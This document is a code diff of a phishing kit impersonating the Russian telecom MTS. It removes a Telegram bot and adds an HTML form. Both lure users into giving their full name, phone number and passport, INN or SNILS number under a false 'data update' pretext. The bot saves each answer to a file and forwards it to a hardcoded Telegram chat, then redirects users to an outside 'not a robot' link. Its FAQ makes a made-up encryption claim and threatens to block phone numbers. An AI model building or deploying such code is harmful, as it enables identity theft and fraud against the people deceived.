@@ -1,327 +1,111 @@
-import logging
-import asyncio
-import re
-from datetime import datetime
-from aiogram import Bot, Dispatcher, types, F
-from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.fsm.context import FSMContext
-from aiogram.filters import Command
-from aiogram.fsm.storage.memory import MemoryStorage
-import urllib
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>МТС Обновление данных</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    h2 { color: #d32f2f; }
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+    button {
+      background: #d32f2f;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover { background: #b71c1c; }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>🔐 Обновление данных</h2>
 
-helptext = "Здравствуйте! Мои данные попали в общий доступ, произошло мошенничество! Помогите мне!"
-encoded_helptext = urllib.parse.quote(helptext)
+    <div id="step1">
+      <p>Введите ФИО:</p>
+      <input type="text" id="fullname" placeholder="Фамилия Имя Отчество">
+      <button onclick="nextStep(1)">Далее</button>
+    </div>
 
-# ===== Укажи свой токен и имя бота =====
-API_TOKEN = "ТОКЕН"
-FORWARD_TO_CHAT_ID = 8321802362   # Куда пересылать ФИО
-DATA_FILE = "reg.txt"
-BOT_NAME = "МТС"  # Имя бота для записи вместе с юзернеймом
+    <div id="step2" class="hidden">
+      <p>Введите телефон (+7...):</p>
+      <input type="text" id="phone" placeholder="+79991234567">
+      <button onclick="nextStep(2)">Далее</button>
+    </div>
 
-logging.basicConfig(level=logging.INFO)
+    <div id="step3" class="hidden">
+      <p>Выберите документ:</p>
+      <select id="doctype">
+        <option value="Паспорт">📄 Паспорт</option>
+        <option value="ИНН">🧾 ИНН</option>
+        <option value="СНИЛС">🟢 СНИЛС</option>
+      </select>
+      <button onclick="nextStep(3)">Далее</button>
+    </div>
 
-bot = Bot(token=API_TOKEN)
-dp = Dispatcher(storage=MemoryStorage())
+    <div id="step4" class="hidden">
+      <p>Введите номер документа:</p>
+      <input type="text" id="docnum" placeholder="4510 123456">
+      <button onclick="finish()">Завершить</button>
+    </div>
 
-async def send_message(message: types.Message, text: str, kb=None, parse_mode=None):
-    sent = await message.answer(text, reply_markup=kb, parse_mode=parse_mode)
-    return sent
+    <div id="done" class="hidden">
+      <h3>✅ Спасибо!</h3>
+      <p>Данные сохранены. Подтвердите, что вы не робот:</p>
+      <button onclick="window.open('https://redirect.figma.site/', '_blank')">
+        Подтвердить
+      </button>
+    </div>
+  </div>
 
-# ===== Функция для постепенного сохранения и пересылки данных =====
-async def save_and_forward_partial(message: types.Message, state: FSMContext, is_complete=False):
-    data = await state.get_data()
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    user_id = message.from_user.id
-    username = message.from_user.username or ''
-    # Объединяем юзернейм и имя бота
-    user_with_bot = f"@{username} ({BOT_NAME})" if username else f"({BOT_NAME})"
-    
-    # Формируем запись для файла
-    doc_type = data.get('document_type', '')
-    doc_num = data.get('document_number', '')
-    
-    record = (
-        f"{timestamp}\t{user_id}\t{user_with_bot}\t"
-        f"{data.get('fullname', '')}\t{data.get('phone', '')}\t"
-        f"{doc_type} {doc_num}\n"
-    )
-    
-    # Всегда записываем в reg.txt, даже если данные частичные
-    try:
-        with open(DATA_FILE, "a", encoding="utf-8") as f:
-            f.write(record)
-        logging.info(f"Записана строка в {DATA_FILE}: {record.strip()}")
-    except Exception as e:
-        logging.error(f"Ошибка при записи в файл: {e}")
-    
-    # Формируем текст для пересылки в Telegram
-    status = "Полные данные" if is_complete else "Частичные данные"
-    forward_text = (
-        f"{status} для {user_with_bot} ({user_id}):\n"
-    )
-    if 'fullname' in data:
-        forward_text += f"ФИО: {data['fullname']}\n"
-    if 'phone' in data:
-        forward_text += f"Телефон: {data['phone']}\n"
-    if doc_type and doc_num:
-        forward_text += f"Документ: {doc_type} {doc_num}\n"
-    
-    # Пересылаем в Telegram-чат
-    try:
-        await bot.send_message(FORWARD_TO_CHAT_ID, forward_text)
-        logging.info(f"Пересланы данные в чат {FORWARD_TO_CHAT_ID}: {forward_text.strip()}")
-    except Exception as e:
-        logging.error(f"Ошибка при пересылке в Telegram: {e}")
+  <script>
+    function nextStep(step) {
+      if (step === 1) {
+        const fullname = document.getElementById("fullname").value.trim();
+        if (fullname.length < 5) { alert("Введите корректное ФИО"); return; }
+        document.getElementById("step1").classList.add("hidden");
+        document.getElementById("step2").classList.remove("hidden");
+      }
+      else if (step === 2) {
+        const phone = document.getElementById("phone").value.trim();
+        if (!phone.startsWith("+7") || phone.length < 11) { alert("Введите корректный номер"); return; }
+        document.getElementById("step2").classList.add("hidden");
+        document.getElementById("step3").classList.remove("hidden");
+      }
+      else if (step === 3) {
+        document.getElementById("step3").classList.add("hidden");
+        document.getElementById("step4").classList.remove("hidden");
+      }
+    }
 
-class Form(StatesGroup):
-    fullname = State()
-    phone = State()
-    document_type = State()
-    document_number = State()
-
-main_menu = ReplyKeyboardMarkup(
-    keyboard=[
-        [KeyboardButton(text="📝 Обновить данные")],
-        [KeyboardButton(text="🔄 Поменять тариф")],
-        [KeyboardButton(text="💳 Проверить баланс")],
-        [KeyboardButton(text="💸 Пополнить баланс")],
-        [KeyboardButton(text="🛠️ Дополнительные услуги")]
-    ],
-    resize_keyboard=True
-)
-
-additional_services_menu = ReplyKeyboardMarkup(
-    keyboard=[
-        [KeyboardButton(text="❓ Часто задаваемые вопросы")],
-        [KeyboardButton(text="ℹ️ Инструкция")],
-        [KeyboardButton(text="📞 Связаться с техподдержкой")],
-        [KeyboardButton(text="↩️ Вернуться назад")]
-    ],
-    resize_keyboard=True
-)
-
-back_button = ReplyKeyboardMarkup(
-    keyboard=[
-        [KeyboardButton(text="↩️ Вернуться назад")]
-    ],
-    resize_keyboard=True
-)
-
-unauthorized_action_menu = ReplyKeyboardMarkup(
-    keyboard=[
-        [KeyboardButton(text="🔐 Авторизоваться")],
-        [KeyboardButton(text="↩️ Сменить действие")]
-    ],
-    resize_keyboard=True
-)
-
-@dp.message(Command("start"))
-async def cmd_start(message: types.Message, state: FSMContext):
-    await state.clear()
-    await send_message(message, "🏠 Главное меню:", main_menu)
-
-@dp.message(F.text == "📝 Обновить данные")
-async def start_form(message: types.Message, state: FSMContext):
-    await state.set_state(Form.fullname)
-    await send_message(message, "<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>", parse_mode="HTML")
-    await send_message(message, "👤 Укажите Фамилию Имя Отчество полностью (только текст):", back_button)
-
-@dp.message(Form.fullname)
-async def get_fullname(message: types.Message, state: FSMContext):
-    if message.text == "↩️ Вернуться назад":
-        await state.clear()
-        await send_message(message, "🏠 Главное меню:", main_menu)
-        return
-    if not re.match(r'^[А-Яа-яЁё\s-]+$', message.text):
-        await send_message(message, "❌ ФИО должно содержать только буквы. Попробуйте снова.", back_button)
-        return
-    clean_text = re.sub(r'\s+', ' ', message.text.strip())
-    await state.update_data(fullname=clean_text)
-    
-    await save_and_forward_partial(message, state)
-
-    await state.set_state(Form.phone)
-    await send_message(message, "<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>", parse_mode="HTML")
-    await send_message(message, "📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567):", back_button)
-
-@dp.message(Form.phone)
-async def get_phone(message: types.Message, state: FSMContext):
-    if message.text == "↩️ Вернуться назад":
-        await state.set_state(Form.fullname)
-        await send_message(message, "<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>", parse_mode="HTML")
-        await send_message(message, "👤 Укажите Фамилию Имя Отчество полностью (только текст):", back_button)
-        return
-    phone = message.text.strip()
-    
-    digits = re.sub(r'[^0-9]', '', phone)
-    if not (phone.startswith('+7') or phone.startswith('7')):
-        await send_message(message, "❌ Номер телефона должен начинаться с +7 или 7. Попробуйте снова.", back_button)
-        return
-    if len(digits) < 10 or len(digits) > 11:
-        await send_message(message, "❌ Номер телефона должен содержать 10 или 11 цифр. Попробуйте снова.", back_button)
-        return
-    
-    await state.update_data(phone=phone)
-    await save_and_forward_partial(message, state)
-
-    kb = ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text="📄 Паспорт")],
-            [KeyboardButton(text="🧾 ИНН")],
-            [KeyboardButton(text="🟢 СНИЛС")],
-            [KeyboardButton(text="↩️ Вернуться назад")]
-        ],
-        resize_keyboard=True
-    )
-    await state.set_state(Form.document_type)
-    await send_message(message, "Выберите документ:", kb)
-
-@dp.message(Form.document_type)
-async def get_document_type(message: types.Message, state: FSMContext):
-    if message.text == "↩️ Вернуться назад":
-        await state.set_state(Form.phone)
-        await send_message(message, "<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>", parse_mode="HTML")
-        await send_message(message, "📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567):", back_button)
-        return
-    if message.text == "📄 Паспорт":
-        await state.update_data(document_type="Паспорт")
-        await state.set_state(Form.document_number)
-        await send_message(message, "<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>", parse_mode="HTML")
-        await send_message(message, "Введите серию и номер паспорта (пример: 4510 123456):", back_button)
-    elif message.text == "🧾 ИНН":
-        await state.update_data(document_type="ИНН")
-        await state.set_state(Form.document_number)
-        await send_message(message, "<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>", parse_mode="HTML")
-        await send_message(message, "Введите ИНН (пример: 500100732259):", back_button)
-    elif message.text == "🟢 СНИЛС":
-        await state.update_data(document_type="СНИЛС")
-        await state.set_state(Form.document_number)
-        await send_message(message, "<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>", parse_mode="HTML")
-        await send_message(message, "Введите СНИЛС (пример: 112-233-445 95):", back_button)
-    else:
-        await send_message(message, "Выберите корректный документ.", back_button)
-        return
-    
-    await save_and_forward_partial(message, state)
-
-@dp.message(Form.document_number)
-async def get_document_number(message: types.Message, state: FSMContext):
-    if message.text == "↩️ Вернуться назад":
-        kb = ReplyKeyboardMarkup(
-            keyboard=[
-                [KeyboardButton(text="📄 Паспорт")],
-                [KeyboardButton(text="🧾 ИНН")],
-                [KeyboardButton(text="🟢 СНИЛС")],
-                [KeyboardButton(text="↩️ Вернуться назад")]
-            ],
-            resize_keyboard=True
-        )
-        await state.set_state(Form.document_type)
-        await send_message(message, "Выберите документ:", kb)
-        return
-    await state.update_data(document_number=message.text)
-    
-    # Финальная запись в reg.txt
-    await save_and_forward_partial(message, state, is_complete=True)
-
-    # ✅ Отправляем сообщение с кнопкой для перехода на сайт
-    inline_kb = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [InlineKeyboardButton(text="Подтвердите, что не робот", url="https://redirect.figma.site/")]
-        ]
-    )
-    await message.answer("Для завершения подтвердите что вы не робот!", reply_markup=inline_kb)
-
-    await state.clear()
-
-@dp.message(F.text == "🔄 Поменять тариф")
-async def change_tariff(message: types.Message):
-    await send_message(message, "Мы не можем поменять из-за того что вы не авторизовались.", unauthorized_action_menu)
-
-@dp.message(F.text == "💳 Проверить баланс")
-async def check_balance(message: types.Message):
-    await send_message(message, "Мы не можем проверить из-за того что вы не авторизовались.", unauthorized_action_menu)
-
-@dp.message(F.text == "💸 Пополнить баланс")
-async def refill_balance(message: types.Message):
-    await send_message(message, "Мы не можем пополнить из-за того что вы не авторизовались.", unauthorized_action_menu)
-
-@dp.message(F.text == "🛠️ Дополнительные услуги")
-async def additional_services_menu_handler(message: types.Message):
-    await send_message(message, "🛠️ Выберите опцию:", additional_services_menu)
-
-@dp.message(F.text == "❓ Часто задаваемые вопросы")
-async def faq_menu(message: types.Message):
-    kb = ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text="🚫 Блокировка номера телефона из-за неактуализации")],
-            [KeyboardButton(text="🔒 Это безопасно?")],
-            [KeyboardButton(text="⚡️ Почему через Telegram?")],
-            [KeyboardButton(text="📑 Какие документы можно использовать?")],
-            [KeyboardButton(text="🔁 Можно ли исправить ошибку?")],
-            [KeyboardButton(text="↩️ Вернуться назад")]
-        ],
-        resize_keyboard=True
-    )
-    await send_message(message, "❓ Часто задаваемые вопросы:", kb)
-
-@dp.message(F.text == "🚫 Блокировка номера телефона из-за неактуализации")
-async def faq_penalty(message: types.Message):
-    await send_message(message, "⚠️ Если номер телефона не обновлён вовремя, он может быть заблокирован до подтверждения актуальных данных.", back_button)
-
-@dp.message(F.text == "🔒 Это безопасно?")
-async def faq_safe(message: types.Message):
-    await send_message(message, "🔐 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование).", back_button)
-
-@dp.message(F.text == "⚡️ Почему через Telegram?")
-async def faq_telegram(message: types.Message):
-    await send_message(message, "⚡️ Для удобства и переход на цифровые площадки.", back_button)
-
-@dp.message(F.text == "🔁 Можно ли исправить ошибку?")
-async def faq_fix(message: types.Message):
-    await send_message(message, "✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод.", back_button)
-
-@dp.message(F.text == "📑 Какие документы можно использовать?")
-async def faq_documents(message: types.Message):
-    await send_message(message, "👉 Паспорт, ИНН, СНИЛС.", back_button)
-
-@dp.message(F.text == "ℹ️ Инструкция")
-async def instruction(message: types.Message):
-    text = (
-        "📋 Чтобы обновить данные:\n"
-        "1️⃣ Нажмите «Обновить данные».\n"
-        "2️⃣ Отправьте номер телефона.\n"
-        "3️⃣ Выберите документ и введите его номер.\n"
-        "4️⃣ Получите подтверждение."
-    )
-    await send_message(message, text, back_button)
-
-@dp.message(F.text == "📞 Связаться с техподдержкой")
-async def contact_support(message: types.Message):
-    support_text = (
-        "📞 Для связи с техподдержкой нажмите на ссылку ниже или напишите напрямую в чат:\n"
-        f"<a href='tg://resolve?domain=techsupgkh'>@techsupgkh</a>"
-    )
-    await send_message(message, support_text, parse_mode="HTML", kb=back_button)
-
-@dp.message(F.text == "🔐 Авторизоваться")
-async def authorize(message: types.Message, state: FSMContext):
-    await start_form(message, state)
-
-@dp.message(F.text == "↩️ Сменить действие")
-async def change_action(message: types.Message):
-    await send_message(message, "🏠 Главное меню:", main_menu)
-
-# ===== Возврат назад =====
-@dp.message(F.text == "↩️ Вернуться назад")
-async def back_to_menu(message: types.Message, state: FSMContext):
-    await state.clear()
-    await send_message(message, "🏠 Главное меню:", main_menu)
-
-# ===== Запуск =====
-async def main():
-    await dp.start_polling(bot)
-
-if __name__ == "__main__":
-    asyncio.run(main())
+    function finish() {
+      const docnum = document.getElementById("docnum").value.trim();
+      if (docnum.length < 5) { alert("Введите корректный номер документа"); return; }
+      document.getElementById("step4").classList.add("hidden");
+      document.getElementById("done").classList.remove("hidden");
+    }
+  </script>
+</body>
+</html>
